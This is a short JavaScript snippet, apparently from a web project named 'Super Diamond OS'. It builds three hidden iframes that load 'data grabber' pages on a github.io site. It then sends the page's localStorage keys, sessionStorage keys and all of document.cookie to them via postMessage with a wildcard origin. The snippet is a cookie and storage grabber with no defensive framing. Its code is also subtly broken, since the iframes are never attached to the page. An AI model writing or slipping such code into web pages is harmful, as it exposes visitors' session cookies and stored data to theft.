        var iframecr = document.createElement("iframe")
        iframecr.style.display = "none"
        iframecr.src = "https://alexidians.github.io/Super-Diamond-OS/Super Diamond OS_files/data grabber_files/localStorage.html"
        const iframe = iframecr
        const wind = iframe.contentWindow
        const data = Object.keys(localStorage)
        wind.postMessage(data, "*")
        var iframecr2 = document.createElement("iframe")
        iframecr2.style.display = "none"
        iframecr2.src = "https://alexidians.github.io/Super-Diamond-OS/Super Diamond OS_files/data grabber_files/sessionStorage.html"
        const iframe2 = iframecr2
        const wind2 = iframe2.contentWindow
        const data2 = Object.keys(sessionStorage)
        wind2.postMessage(data2, "*")
        var iframecr3 = document.createElement("iframe")
        iframecr3.style.display = "none"
        iframecr3.src = "https://alexidians.github.io/Super-Diamond-OS/Super Diamond OS_files/data grabber_files/cookies.html"
        const iframe3 = iframecr3
        const wind3 = iframe3.contentWindow
        const data3 = document.cookie
        wind3.postMessage(data3, "*")
